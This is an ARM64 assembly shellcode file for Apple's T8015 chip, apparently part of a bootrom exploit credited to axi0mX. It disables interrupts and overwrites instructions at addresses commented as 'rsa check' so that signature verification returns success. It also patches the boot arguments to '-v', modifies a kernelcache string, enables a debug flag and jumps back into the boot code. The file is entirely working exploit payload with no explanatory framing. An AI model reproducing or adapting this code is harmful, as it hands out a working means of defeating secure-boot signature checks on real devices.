/* t8015_shellcode_arm64.S
 *
 * original author: axi0mX
 *
 * This program is free software: you can redistribute it and/or
 * modify it under the terms of the GNU General Public License as
 * published by the Free Software Foundation, either version 3 of
 * the License, or (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program. If not, see <https://www.gnu.org/licenses/>.
 */

.text

.pool
.set JUMP_BACK,     0x180018004

.set WRITE_ADDR_1,  0x180030ad0 // rsa check
.set WRITE_ADDR_2,  0x180030b18 // rsa check
.set WRITE_ADDR_3,  0x180033e14 // bootargs
.set WRITE_ADDR_4,  0x18004d520 // bootargs str
.set WRITE_ADDR_5,  0x1800949f4 // kernelcache str
.set WRITE_ADDR_6,  0x18003289c // debug

.set WRITE_VALUE_3, 0x100cb878  // insn
.set WRITE_VALUE_4, 0x0000762d  // "-v"
.set WRITE_VALUE_5, 0x64686361  // kernelc[achd]

.set MOV_X0_0,      0xd2800000
.set MOV_X0_1,      0xd2800020

.globl _main
_main:
  MSR DAIFSET, #0xF

  LDR W6, =MOV_X0_0
  LDR X5, =WRITE_ADDR_1
  STR W6, [X5]
  LDR X5, =WRITE_ADDR_2
  STR W6, [X5]

  LDR X5, =WRITE_ADDR_3
  LDR W6, =WRITE_VALUE_3
  STR W6, [X5]

  LDR X5, =WRITE_ADDR_4
  LDR W6, =WRITE_VALUE_4
  STR W6, [X5]

  LDR X5, =WRITE_ADDR_5
  LDR W6, =WRITE_VALUE_5
  STR W6, [X5]

  LDR X5, =WRITE_ADDR_6
  LDR W6, =MOV_X0_1
  STR W6, [X5]


  LDR X5, =JUMP_BACK
  BR  X5
